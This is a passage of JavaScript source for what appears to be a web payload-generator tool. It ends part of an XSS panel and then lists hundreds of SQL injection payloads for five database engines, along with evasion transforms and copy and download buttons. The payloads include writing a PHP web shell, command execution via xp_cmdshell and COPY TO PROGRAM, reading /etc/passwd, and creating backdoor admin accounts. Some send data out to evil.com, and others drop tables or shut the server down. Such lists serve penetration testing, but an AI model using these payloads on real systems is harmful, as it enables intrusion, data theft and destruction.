          ${Object.entries(XSS_TRANSFORMS).map(([k, t]) => `
            <label><input type="checkbox" data-k="${k}" ${selectedTransforms.includes(k) ? "checked" : ""}> ${esc(t.label)}</label>`).join("")}
        </div>
        <div class="tk-btns">
          <button class="btn sm" id="xss-copyall">Copy all shown (${variants.length})</button>
          <button class="btn sm ghost" id="xss-download">Download .txt</button>
          <button class="btn sm ghost" id="xss-clear">Clear transforms</button>
        </div>
        <div class="pg-stats-row">
          <div class="stat"><div class="stat-n">${baseFiltered().length}</div><div class="stat-l">base payloads matched</div></div>
          <div class="stat"><div class="stat-n">${variants.length}</div><div class="stat-l">variants generated</div></div>
          <div class="stat"><div class="stat-n">${selectedTransforms.length}</div><div class="stat-l">transforms active</div></div>
        </div>
        <div class="pg-list" id="xss-list">${variants.map((v, i) => `
          <div class="pg-item">
            <div class="pg-item-top"><span class="pg-item-group">${esc(v.cat)} &middot; ${esc(v.type)} &middot; ${esc(v.label)}</span><button class="btn sm ghost pg-copy" data-i="${i}">copy</button></div>
            <code class="dl-cmd cmd-block pg-code">${esc(v.p)}</code>
          </div>`).join("") || `<div class="pg-empty">No payloads match the current filters.</div>`}
        </div>
      </div>`;

    container.querySelector("#xss-search").oninput = (e) => { search = e.target.value; paint(); };
    container.querySelector("#xss-cat").onchange = (e) => { catFilter = e.target.value; paint(); };
    container.querySelector("#xss-type").onchange = (e) => { typeFilter = e.target.value; paint(); };
    container.querySelector("#xss-mode-chain").onchange = () => { mode = "chain"; paint(); };
    container.querySelector("#xss-mode-each").onchange = () => { mode = "each"; paint(); };
    container.querySelectorAll("#xss-transforms input[type=checkbox]").forEach((cb) => {
      cb.onchange = () => {
        const k = cb.dataset.k;
        if (cb.checked) selectedTransforms.push(k);
        else selectedTransforms = selectedTransforms.filter((x) => x !== k);
        paint();
      };
    });
    container.querySelector("#xss-clear").onclick = () => { selectedTransforms = []; paint(); };
    container.querySelector("#xss-copyall").onclick = (e) => { copyText(variants.map((v) => v.p).join("\n")); flashBtn(e.target, "copied!"); };
    container.querySelector("#xss-download").onclick = () => downloadText("xss-payloads.txt", variants.map((v) => v.p).join("\n"));
    container.querySelectorAll(".pg-copy").forEach((b) => {
      b.onclick = () => { copyText(variants[+b.dataset.i].p); flashBtn(b, "copied"); };
    });
  }

  paint();
}

/* ============================================================================================
 * SQL Injection
 * ========================================================================================== */

function sqliUnionNulls(n, quote, midClause, suffix) {
  const out = [];
  for (let i = 1; i <= n; i++) {
    out.push({ p: quote + " UNION SELECT " + Array(i).fill("NULL").join(",") + midClause + suffix, cat: "UNION-based" });
  }
  return out;
}

const SQLI_PAYLOADS = {
  mysql: [
    ...sqliUnionNulls(10, "'", "", "-- -"),
    { p: "' UNION SELECT username,password FROM users-- -", cat: "UNION-based" },
    { p: "' UNION SELECT table_name,NULL FROM information_schema.tables-- -", cat: "UNION-based" },
    { p: "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name=0x7573657273-- -", cat: "UNION-based" },
    { p: "' UNION SELECT NULL,version()-- -", cat: "UNION-based" },
    { p: "' UNION SELECT NULL,@@version-- -", cat: "UNION-based" },
    { p: "' UNION SELECT 1,group_concat(username,0x3a,password) FROM users-- -", cat: "UNION-based" },
    { p: "' AND 1=1-- -", cat: "Blind boolean-based" },
    { p: "' AND 1=2-- -", cat: "Blind boolean-based" },
    { p: "' OR 1=1-- -", cat: "Blind boolean-based" },
    { p: "' OR 1=1#", cat: "Blind boolean-based" },
    { p: "' AND '1'='1", cat: "Blind boolean-based" },
    { p: "' AND '1'='2", cat: "Blind boolean-based" },
    { p: "admin'-- -", cat: "Blind boolean-based" },
    { p: "admin' AND '1'='1", cat: "Blind boolean-based" },
    { p: "' AND SUBSTRING(version(),1,1)='5'-- -", cat: "Blind boolean-based" },
    { p: "' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables LIMIT 1)='a'-- -", cat: "Blind boolean-based" },
    { p: "' AND LENGTH(database())>5-- -", cat: "Blind boolean-based" },
    { p: "' AND ASCII(SUBSTRING((SELECT database()),1,1))>77-- -", cat: "Blind boolean-based" },
    { p: "' AND (SELECT COUNT(*) FROM users)>0-- -", cat: "Blind boolean-based" },
    { p: "' OR EXISTS(SELECT * FROM users WHERE username='admin')-- -", cat: "Blind boolean-based" },
    { p: "' AND SLEEP(5)-- -", cat: "Blind time-based" },
    { p: "' OR SLEEP(5)-- -", cat: "Blind time-based" },
    { p: "'; SELECT SLEEP(5)-- -", cat: "Blind time-based" },
    { p: "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -", cat: "Blind time-based" },
    { p: "' AND IF(1=1,SLEEP(5),0)-- -", cat: "Blind time-based" },
    { p: "' OR IF(1=1,SLEEP(5),0)-- -", cat: "Blind time-based" },
    { p: "' AND SLEEP(5)#", cat: "Blind time-based" },
    { p: "1' AND SLEEP(5) AND '1'='1", cat: "Blind time-based" },
    { p: "' AND (SELECT SLEEP(5) FROM users LIMIT 1)-- -", cat: "Blind time-based" },
    { p: "' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0)-- -", cat: "Blind time-based" },
    { p: "' RLIKE SLEEP(5)-- -", cat: "Blind time-based" },
    { p: "' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -", cat: "Error-based" },
    { p: "' AND updatexml(1,concat(0x7e,(SELECT database())),1)-- -", cat: "Error-based" },
    { p: "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -", cat: "Error-based" },
    { p: "' AND extractvalue(1,concat(0x7e,(SELECT user())))-- -", cat: "Error-based" },
    { p: "' AND updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1)),1)-- -", cat: "Error-based" },
    { p: "' procedure analyse(extractvalue(1,concat(0x7e,version())),1)-- -", cat: "Error-based" },
    { p: "' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version())),1)-- -", cat: "Error-based" },
    { p: "' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version())) USING utf8)))-- -", cat: "Error-based" },
    { p: "' AND EXP(~(SELECT * FROM (SELECT VERSION())a))-- -", cat: "Error-based" },
    { p: "' AND (SELECT * FROM(SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))a)-- -", cat: "Error-based" },
    { p: "' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables)))-- -", cat: "Error-based" },
    { p: "'; DROP TABLE users-- -", cat: "Stacked queries" },
    { p: "'; INSERT INTO users (username,password) VALUES ('hacker','pass')-- -", cat: "Stacked queries" },
    { p: "'; UPDATE users SET password='hacked' WHERE username='admin'-- -", cat: "Stacked queries" },
    { p: "'; CREATE USER 'x'@'%' IDENTIFIED BY 'pass'-- -", cat: "Stacked queries" },
    { p: "'; SELECT * INTO OUTFILE '/var/www/html/shell.php' FROM (SELECT '<?php system($_GET[cmd]); ?>')a-- -", cat: "Stacked queries" },
    { p: "'; SET @a=1-- -", cat: "Stacked queries" },
    { p: "'; SELECT LOAD_FILE('/etc/passwd')-- -", cat: "Stacked queries" },
    { p: "'; SELECT 1 INTO @x FROM users-- -", cat: "Stacked queries" },
    { p: "'; SHUTDOWN-- -", cat: "Stacked queries" },
    { p: "'; CALL mysql.proc()-- -", cat: "Stacked queries" },
  ],
  postgres: [
    ...sqliUnionNulls(10, "'", "", "-- "),
    { p: "' UNION SELECT username,password FROM users-- ", cat: "UNION-based" },
    { p: "' UNION SELECT table_name,NULL FROM information_schema.tables-- ", cat: "UNION-based" },
    { p: "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- ", cat: "UNION-based" },
    { p: "' UNION SELECT NULL,version()-- ", cat: "UNION-based" },
    { p: "' UNION SELECT NULL,current_database()-- ", cat: "UNION-based" },
    { p: "' UNION SELECT NULL,string_agg(username||':'||password,',') FROM users-- ", cat: "UNION-based" },
    { p: "' AND 1=1-- ", cat: "Blind boolean-based" },
    { p: "' AND 1=2-- ", cat: "Blind boolean-based" },
    { p: "' OR 1=1-- ", cat: "Blind boolean-based" },
    { p: "' OR '1'='1", cat: "Blind boolean-based" },
    { p: "' AND '1'='1", cat: "Blind boolean-based" },
    { p: "' AND '1'='2", cat: "Blind boolean-based" },
    { p: "admin'-- ", cat: "Blind boolean-based" },
    { p: "admin' AND '1'='1", cat: "Blind boolean-based" },
    { p: "' AND substring(version(),1,1)='P'-- ", cat: "Blind boolean-based" },
    { p: "' AND (SELECT substring(table_name,1,1) FROM information_schema.tables LIMIT 1)='a'-- ", cat: "Blind boolean-based" },
    { p: "' AND length(current_database())>3-- ", cat: "Blind boolean-based" },
    { p: "' AND ascii(substring((SELECT current_database()),1,1))>77-- ", cat: "Blind boolean-based" },
    { p: "' AND (SELECT count(*) FROM users)>0-- ", cat: "Blind boolean-based" },
    { p: "' AND EXISTS(SELECT * FROM users WHERE username='admin')-- ", cat: "Blind boolean-based" },
    { p: "' AND (SELECT pg_sleep(5))-- ", cat: "Blind time-based" },
    { p: "' OR (SELECT pg_sleep(5))-- ", cat: "Blind time-based" },
    { p: "'; SELECT pg_sleep(5)-- ", cat: "Blind time-based" },
    { p: "' AND 1=(SELECT 1 FROM pg_sleep(5))-- ", cat: "Blind time-based" },
    { p: "' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)-- ", cat: "Blind time-based" },
    { p: "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- ", cat: "Blind time-based" },
    { p: "' AND (SELECT pg_sleep(5) WHERE 1=1)-- ", cat: "Blind time-based" },
    { p: "1' AND (SELECT pg_sleep(5)) AND '1'='1", cat: "Blind time-based" },
    { p: "'||(SELECT pg_sleep(5))||'", cat: "Blind time-based" },
    { p: "' AND (SELECT pg_sleep(5) FROM users LIMIT 1)-- ", cat: "Blind time-based" },
    { p: "' AND 1::int=(SELECT 1 FROM pg_sleep(5))-- ", cat: "Blind time-based" },
    { p: "' AND 1=CAST((SELECT version()) AS int)-- ", cat: "Error-based" },
    { p: "' AND 1=CAST((SELECT current_database()) AS int)-- ", cat: "Error-based" },
    { p: "' AND 1=CAST((SELECT string_agg(table_name,',')) AS int) FROM information_schema.tables-- ", cat: "Error-based" },
    { p: "' AND cast((SELECT current_user) as int)=1-- ", cat: "Error-based" },
    { p: "' AND (SELECT 1/0 FROM users WHERE username='admin')-- ", cat: "Error-based" },
    { p: "' AND 1=CAST((SELECT usename FROM pg_user LIMIT 1) AS int)-- ", cat: "Error-based" },
    { p: "' AND 1=CAST((SELECT string_agg(usename,',') FROM pg_user) AS int)-- ", cat: "Error-based" },
    { p: "' AND (SELECT CAST((SELECT version()) AS numeric))-- ", cat: "Error-based" },
    { p: "' AND 1=(SELECT 1 WHERE 1=CAST((SELECT current_setting('data_directory')) AS int))-- ", cat: "Error-based" },
    { p: "' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 0) AS int)-- ", cat: "Error-based" },
    { p: "'; DROP TABLE users-- ", cat: "Stacked queries" },
    { p: "'; INSERT INTO users (username,password) VALUES ('hacker','pass')-- ", cat: "Stacked queries" },
    { p: "'; UPDATE users SET password='hacked' WHERE username='admin'-- ", cat: "Stacked queries" },
    { p: "'; CREATE ROLE hacker LOGIN PASSWORD 'pass' SUPERUSER-- ", cat: "Stacked queries" },
    { p: "'; COPY (SELECT '') TO PROGRAM 'id'-- ", cat: "Stacked queries" },
    { p: "'; CREATE TABLE cmd_exec(output text);COPY cmd_exec FROM PROGRAM 'id'-- ", cat: "Stacked queries" },
    { p: "'; ALTER USER postgres WITH PASSWORD 'hacked'-- ", cat: "Stacked queries" },
    { p: "'; SELECT lo_import('/etc/passwd')-- ", cat: "Stacked queries" },
    { p: "'; DELETE FROM users WHERE '1'='1", cat: "Stacked queries" },
    { p: "'; GRANT ALL PRIVILEGES ON DATABASE postgres TO hacker-- ", cat: "Stacked queries" },
  ],
  mssql: [
    ...sqliUnionNulls(10, "'", "", "--"),
    { p: "' UNION SELECT username,password FROM users--", cat: "UNION-based" },
    { p: "' UNION SELECT name,NULL FROM sys.tables--", cat: "UNION-based" },
    { p: "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--", cat: "UNION-based" },
    { p: "' UNION SELECT NULL,@@version--", cat: "UNION-based" },
    { p: "' UNION SELECT NULL,DB_NAME()--", cat: "UNION-based" },
    { p: "' UNION SELECT NULL,(SELECT username+':'+password FROM users FOR XML PATH(''))--", cat: "UNION-based" },
    { p: "' AND 1=1--", cat: "Blind boolean-based" },
    { p: "' AND 1=2--", cat: "Blind boolean-based" },
    { p: "' OR 1=1--", cat: "Blind boolean-based" },
    { p: "' OR '1'='1", cat: "Blind boolean-based" },
    { p: "' AND '1'='1", cat: "Blind boolean-based" },
    { p: "' AND '1'='2", cat: "Blind boolean-based" },
    { p: "admin'--", cat: "Blind boolean-based" },
    { p: "admin' AND '1'='1", cat: "Blind boolean-based" },
    { p: "' AND SUBSTRING(@@version,1,1)='M'--", cat: "Blind boolean-based" },
    { p: "' AND (SELECT TOP 1 SUBSTRING(name,1,1) FROM sys.tables)='u'--", cat: "Blind boolean-based" },
    { p: "' AND LEN(DB_NAME())>3--", cat: "Blind boolean-based" },
    { p: "' AND ASCII(SUBSTRING(DB_NAME(),1,1))>77--", cat: "Blind boolean-based" },
    { p: "' AND (SELECT COUNT(*) FROM users)>0--", cat: "Blind boolean-based" },
    { p: "' AND EXISTS(SELECT * FROM users WHERE username='admin')--", cat: "Blind boolean-based" },
    { p: "'; WAITFOR DELAY '0:0:5'--", cat: "Blind time-based" },
    { p: "' OR 1=1; WAITFOR DELAY '0:0:5'--", cat: "Blind time-based" },
    { p: "' IF (1=1) WAITFOR DELAY '0:0:5'--", cat: "Blind time-based" },
    { p: "'; IF (SELECT COUNT(*) FROM users)>0 WAITFOR DELAY '0:0:5'--", cat: "Blind time-based" },
    { p: "1'; WAITFOR DELAY '0:0:5'--", cat: "Blind time-based" },
    { p: "'; BEGIN WAITFOR DELAY '0:0:5' END--", cat: "Blind time-based" },
    { p: "' AND 1=(SELECT 1 WHERE 1=1);WAITFOR DELAY '0:0:5'--", cat: "Blind time-based" },
    { p: "'; exec master..xp_cmdshell 'ping -n 5 127.0.0.1'--", cat: "Blind time-based" },
    { p: "' WAITFOR DELAY '0:0:05'--", cat: "Blind time-based" },
    { p: "'; IF EXISTS(SELECT * FROM users) WAITFOR DELAY '0:0:5'--", cat: "Blind time-based" },
    { p: "' AND 1=CONVERT(int,(SELECT @@version))--", cat: "Error-based" },
    { p: "' AND 1=CONVERT(int,(SELECT DB_NAME()))--", cat: "Error-based" },
    { p: "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sys.tables))--", cat: "Error-based" },
    { p: "' AND 1=CAST((SELECT SUSER_SNAME()) AS int)--", cat: "Error-based" },
    { p: "' AND 1=(SELECT 1/0)--", cat: "Error-based" },
    { p: "' AND 1=CONVERT(int,(SELECT TOP 1 password FROM users))--", cat: "Error-based" },
    { p: "' HAVING 1=1--", cat: "Error-based" },
    { p: "' GROUP BY columnnames HAVING 1=1--", cat: "Error-based" },
    { p: "' AND 1=CONVERT(int,(SELECT STRING_AGG(name,',') FROM sys.tables))--", cat: "Error-based" },
    { p: "' AND 1=CAST((SELECT TOP 1 name FROM sys.databases) AS int)--", cat: "Error-based" },
    { p: "'; DROP TABLE users--", cat: "Stacked queries" },
    { p: "'; INSERT INTO users (username,password) VALUES ('hacker','pass')--", cat: "Stacked queries" },
    { p: "'; UPDATE users SET password='hacked' WHERE username='admin'--", cat: "Stacked queries" },
    { p: "'; exec xp_cmdshell('whoami')--", cat: "Stacked queries" },
    { p: "'; EXEC sp_configure 'show advanced options',1;RECONFIGURE--", cat: "Stacked queries" },
    { p: "'; EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE--", cat: "Stacked queries" },
    { p: "'; CREATE LOGIN hacker WITH PASSWORD='Pass123!'--", cat: "Stacked queries" },
    { p: "'; ALTER LOGIN sa WITH PASSWORD='hacked'--", cat: "Stacked queries" },
    { p: "'; EXEC master..xp_dirtree '\\\\evil.com\\share'--", cat: "Stacked queries" },
    { p: "'; BULK INSERT users FROM '\\\\evil.com\\share\\file.csv'--", cat: "Stacked queries" },
  ],
  oracle: [
    ...sqliUnionNulls(10, "'", " FROM dual", "--"),
    { p: "' UNION SELECT username,password FROM users--", cat: "UNION-based" },
    { p: "' UNION SELECT table_name,NULL FROM all_tables--", cat: "UNION-based" },
    { p: "' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--", cat: "UNION-based" },
    { p: "' UNION SELECT NULL,banner FROM v$version--", cat: "UNION-based" },
    { p: "' UNION SELECT NULL,user FROM dual--", cat: "UNION-based" },
    { p: "' UNION SELECT NULL,(SELECT LISTAGG(username,',') WITHIN GROUP (ORDER BY username) FROM users) FROM dual--", cat: "UNION-based" },
    { p: "' AND 1=1--", cat: "Blind boolean-based" },
    { p: "' AND 1=2--", cat: "Blind boolean-based" },
    { p: "' OR 1=1--", cat: "Blind boolean-based" },
    { p: "' OR '1'='1", cat: "Blind boolean-based" },
    { p: "' AND '1'='1", cat: "Blind boolean-based" },
    { p: "' AND '1'='2", cat: "Blind boolean-based" },
    { p: "admin'--", cat: "Blind boolean-based" },
    { p: "admin' AND '1'='1", cat: "Blind boolean-based" },
    { p: "' AND SUBSTR((SELECT banner FROM v$version WHERE rownum=1),1,1)='O'--", cat: "Blind boolean-based" },
    { p: "' AND (SELECT SUBSTR(table_name,1,1) FROM all_tables WHERE rownum=1)='A'--", cat: "Blind boolean-based" },
    { p: "' AND LENGTH(user)>3--", cat: "Blind boolean-based" },
    { p: "' AND ASCII(SUBSTR(user,1,1))>77--", cat: "Blind boolean-based" },
    { p: "' AND (SELECT COUNT(*) FROM users)>0--", cat: "Blind boolean-based" },
    { p: "' AND EXISTS(SELECT * FROM users WHERE username='ADMIN')--", cat: "Blind boolean-based" },
    { p: "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", cat: "Blind time-based" },
    { p: "' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", cat: "Blind time-based" },
    { p: "' AND (SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 0 END FROM dual)=1--", cat: "Blind time-based" },
    { p: "' AND (SELECT COUNT(*) FROM all_users t1,all_users t2,all_users t3)>0 AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--", cat: "Blind time-based" },
    { p: "'||(SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 0 END FROM dual)||'", cat: "Blind time-based" },
    { p: "' AND 5=DBMS_PIPE.RECEIVE_MESSAGE('RDS',5)--", cat: "Blind time-based" },
    { p: "1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", cat: "Blind time-based" },
    { p: "' AND (SELECT UTL_INADDR.GET_HOST_NAME('10.0.0.1') FROM dual)=1--", cat: "Blind time-based" },
    { p: "' OR DBMS_LOCK.SLEEP(5)=1--", cat: "Blind time-based" },
    { p: "' AND 1=(CASE WHEN 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 1 END)--", cat: "Blind time-based" },
    { p: "' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE rownum=1))--", cat: "Error-based" },
    { p: "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--", cat: "Error-based" },
    { p: "' AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||(SELECT banner FROM v$version WHERE rownum=1)||CHR(62))) FROM dual)--", cat: "Error-based" },
    { p: "' AND 1=(SELECT DBMS_XMLGEN.GETXML('SELECT banner FROM v$version') FROM dual)--", cat: "Error-based" },
    { p: "' AND 1/0=1--", cat: "Error-based" },
    { p: "' AND 1=(SELECT to_char(1/0) FROM dual)--", cat: "Error-based" },
    { p: "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual))--", cat: "Error-based" },
    { p: "' AND 1=ORDSYS.ORD_DICOM.GETMAPPINGXPATH((SELECT banner FROM v$version WHERE rownum=1),1,1)--", cat: "Error-based" },
    { p: "' AND EXTRACTVALUE(1,(SELECT banner FROM v$version WHERE rownum=1)) IS NULL--", cat: "Error-based" },
    { p: "' AND 1=(SELECT HEXTORAW(banner) FROM v$version WHERE rownum=1)--", cat: "Error-based" },
    { p: "' AND (SELECT 1 FROM dual WHERE ROWNUM=1)=(SELECT DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('a','a','a','a') FROM dual)--", cat: "Stacked queries" },
    { p: "'; EXEC DBMS_SCHEDULER.CREATE_JOB('x',job_type=>'PLSQL_BLOCK',job_action=>'BEGIN NULL; END;')--", cat: "Stacked queries" },
    { p: "'; BEGIN EXECUTE IMMEDIATE 'DROP TABLE users'; END;--", cat: "Stacked queries" },
    { p: "'; BEGIN EXECUTE IMMEDIATE 'GRANT DBA TO PUBLIC'; END;--", cat: "Stacked queries" },
    { p: "'; BEGIN EXECUTE IMMEDIATE 'CREATE USER hacker IDENTIFIED BY pass123'; END;--", cat: "Stacked queries" },
    { p: "'; BEGIN dbms_java.grant_permission('PUBLIC','SYS:java.io.FilePermission','<<ALL FILES>>','execute'); END;--", cat: "Stacked queries" },
    { p: "'; BEGIN UTL_HTTP.REQUEST('http://evil.com/'||user); END;--", cat: "Stacked queries" },
    { p: "'; BEGIN UTL_FILE.FOPEN('DIR','shell.txt','W'); END;--", cat: "Stacked queries" },
    { p: "'; BEGIN EXECUTE IMMEDIATE 'ALTER USER SYSTEM IDENTIFIED BY hacked'; END;--", cat: "Stacked queries" },
    { p: "'; BEGIN EXECUTE IMMEDIATE 'CREATE OR REPLACE PROCEDURE p AS BEGIN NULL; END;'; END;--", cat: "Stacked queries" },
  ],
  sqlite: [
    ...sqliUnionNulls(10, "'", "", "--"),
    { p: "' UNION SELECT username,password FROM users--", cat: "UNION-based" },
    { p: "' UNION SELECT name,sql FROM sqlite_master WHERE type='table'--", cat: "UNION-based" },
    { p: "' UNION SELECT NULL,sqlite_version()--", cat: "UNION-based" },
    { p: "' UNION SELECT NULL,group_concat(username||':'||password) FROM users--", cat: "UNION-based" },
    { p: "' UNION SELECT NULL,(SELECT sql FROM sqlite_master LIMIT 1)--", cat: "UNION-based" },
    { p: "' UNION ALL SELECT NULL,NULL--", cat: "UNION-based" },
    { p: "' AND 1=1--", cat: "Blind boolean-based" },
    { p: "' AND 1=2--", cat: "Blind boolean-based" },
    { p: "' OR 1=1--", cat: "Blind boolean-based" },
    { p: "' OR '1'='1", cat: "Blind boolean-based" },
    { p: "' AND '1'='1", cat: "Blind boolean-based" },
    { p: "' AND '1'='2", cat: "Blind boolean-based" },
    { p: "admin'--", cat: "Blind boolean-based" },
    { p: "admin' AND '1'='1", cat: "Blind boolean-based" },
    { p: "' AND substr(sqlite_version(),1,1)='3'--", cat: "Blind boolean-based" },
    { p: "' AND (SELECT substr(name,1,1) FROM sqlite_master LIMIT 1)='u'--", cat: "Blind boolean-based" },
    { p: "' AND length((SELECT name FROM sqlite_master LIMIT 1))>2--", cat: "Blind boolean-based" },
    { p: "' AND unicode(substr((SELECT name FROM sqlite_master LIMIT 1),1,1))>77--", cat: "Blind boolean-based" },
    { p: "' AND (SELECT COUNT(*) FROM users)>0--", cat: "Blind boolean-based" },
    { p: "' AND EXISTS(SELECT * FROM users WHERE username='admin')--", cat: "Blind boolean-based" },
    { p: "' AND 1=(SELECT COUNT(*) FROM sqlite_master WHERE 1=randomblob(100000000))--", cat: "Blind time-based" },
    { p: "' AND (SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2)))))--", cat: "Blind time-based" },
    { p: "' OR (SELECT COUNT(*) FROM sqlite_master WHERE 1=like('a',upper(hex(randomblob(200000000)))))--", cat: "Blind time-based" },
    { p: "' AND CASE WHEN (1=1) THEN (SELECT COUNT(*) FROM sqlite_master a,sqlite_master b,sqlite_master c) ELSE 0 END--", cat: "Blind time-based" },
    { p: "1' AND 1=(SELECT COUNT(*) FROM sqlite_master WHERE 1=randomblob(100000000))--", cat: "Blind time-based" },
    { p: "' AND (SELECT 1 FROM (SELECT COUNT(*) FROM sqlite_master AS t1,sqlite_master AS t2,sqlite_master AS t3))--", cat: "Blind time-based" },
    { p: "' OR 1=(SELECT COUNT(*) FROM sqlite_master WHERE 1=like('%',upper(hex(randomblob(150000000)))))--", cat: "Blind time-based" },
    { p: "' AND CASE (1=1) WHEN 1 THEN randomblob(100000000) ELSE 1 END--", cat: "Blind time-based" },
    { p: "' AND (SELECT count(*) FROM sqlite_master,sqlite_master,sqlite_master,sqlite_master)>0--", cat: "Blind time-based" },
    { p: "' AND heavy_query_placeholder_for_delay()--", cat: "Blind time-based" },
    { p: "' AND 1=CAST((SELECT sql FROM sqlite_master LIMIT 1) AS INTEGER)--", cat: "Error-based" },
    { p: "' AND 1=CAST((SELECT group_concat(name) FROM sqlite_master) AS INTEGER)--", cat: "Error-based" },
    { p: "' AND 1=CAST(sqlite_version() AS INTEGER)--", cat: "Error-based" },
    { p: "' AND 1=CAST((SELECT password FROM users LIMIT 1) AS INTEGER)--", cat: "Error-based" },
    { p: "' AND 1/0--", cat: "Error-based" },
    { p: "' AND zeroblob(-1)--", cat: "Error-based" },
    { p: "' AND 1=CAST((SELECT sql FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET 1) AS INTEGER)--", cat: "Error-based" },
    { p: "' AND 1=CAST((SELECT hex(name) FROM sqlite_master LIMIT 1) AS INTEGER)--", cat: "Error-based" },
    { p: "' AND matchinfo(sqlite_master)--", cat: "Error-based" },
    { p: "' AND 1=CAST((SELECT count(*) FROM pragma_table_info('users')) AS TEXT)||(SELECT sql FROM sqlite_master LIMIT 1)--", cat: "Error-based" },
    { p: "'; DROP TABLE users--", cat: "Stacked queries" },
    { p: "'; INSERT INTO users (username,password) VALUES ('hacker','pass')--", cat: "Stacked queries" },
    { p: "'; UPDATE users SET password='hacked' WHERE username='admin'--", cat: "Stacked queries" },
    { p: "'; ATTACH DATABASE '/var/www/html/shell.php' AS x--", cat: "Stacked queries" },
    { p: "'; CREATE TABLE x(data text);--", cat: "Stacked queries" },
    { p: "'; PRAGMA writable_schema=1;--", cat: "Stacked queries" },
    { p: "'; SELECT load_extension('/tmp/evil.so')--", cat: "Stacked queries" },
    { p: "'; DELETE FROM users WHERE '1'='1", cat: "Stacked queries" },
    { p: "'; ALTER TABLE users ADD COLUMN backdoor TEXT--", cat: "Stacked queries" },
    { p: "'; VACUUM--", cat: "Stacked queries" },
  ],
};

const SQLI_DB_LABELS = { mysql: "MySQL", postgres: "PostgreSQL", mssql: "Microsoft SQL Server", oracle: "Oracle", sqlite: "SQLite" };
const SQLI_CATS = ["UNION-based", "Blind boolean-based", "Blind time-based", "Error-based", "Stacked queries"];

const SQLI_EVASIONS = {
  inlineComment: { label: "Inline comment /**/ instead of spaces", fn: (s) => s.replace(/ /g, "/**/") },
  caseRandomize: { label: "Randomize SQL keyword case", fn: (s) => s.replace(/\b(SELECT|UNION|AND|OR|FROM|WHERE|INSERT|UPDATE|DELETE|DROP|CREATE|EXEC|WAITFOR|SLEEP|ORDER|BY|GROUP|HAVING|LIMIT|OFFSET|CAST|CONVERT|ALTER|GRANT)\b/gi, (m) => m.split("").map((c, i) => (i % 2 === 0 ? c.toUpperCase() : c.toLowerCase())).join("")) },
  doubleDashSpace: { label: "Use tab (%09) between keywords", fn: (s) => s.replace(/ /g, "%09") },
  urlEncodeSpace: { label: "URL-encode spaces (%20)", fn: (s) => s.replace(/ /g, "%20") },
  commentObfuscate: { label: "Insert /*!*/ MySQL version comments", fn: (s) => s.replace(/\b(SELECT|UNION|AND|OR)\b/gi, "/*!$1*/") },
  parenWrap: { label: "Wrap numeric literals in parens", fn: (s) => s.replace(/(\d+)/g, "($1)") },
};

function renderSQLiPanel(container) {
  let db = "mysql";
  let catFilter = "all";
  let search = "";
  let encMode = "none";
  let selectedEvasions = [];

  function baseFiltered() {
    const q = search.trim().toLowerCase();
    return SQLI_PAYLOADS[db].filter((it) => {
      if (catFilter !== "all" && it.cat !== catFilter) return false;
      if (q && !it.p.toLowerCase().includes(q)) return false;
      return true;
    });
  }

  function transformed(p) {
    let out = p;
    for (const k of selectedEvasions) out = SQLI_EVASIONS[k].fn(out);
    return applyEnc(encMode, out);
  }

  function paint() {
    const items = baseFiltered();
    container.innerHTML = `
      <div class="panel pg-panel-inner">
        <h2 class="pg-h2" style="margin-top:0">SQL Injection Payload Generator <span class="pg-count-badge">${SQLI_PAYLOADS[db].length} payloads for ${esc(SQLI_DB_LABELS[db])}</span></h2>
        <p class="muted">UNION-based, blind boolean-based, blind time-based, error-based, and stacked-query payloads across five database engines.</p>
        <div class="pg-sub-tabs" id="sqli-dbtabs">
          ${Object.keys(SQLI_DB_LABELS).map((d) => `<button data-db="${d}" class="${d === db ? "active" : ""}">${esc(SQLI_DB_LABELS[d])}</button>`).join("")}
        </div>
        <div class="tk-row pg-opts-row">
          <input class="tk-f" id="sqli-search" placeholder="search payloads..." value="${esc(search)}" style="flex:2;min-width:180px">
          <select class="tk-f" id="sqli-cat" style="min-width:190px">
            <option value="all"${catFilter === "all" ? " selected" : ""}>All categories</option>
            ${SQLI_CATS.map((c) => `<option value="${esc(c)}"${catFilter === c ? " selected" : ""}>${esc(c)}</option>`).join("")}
          </select>
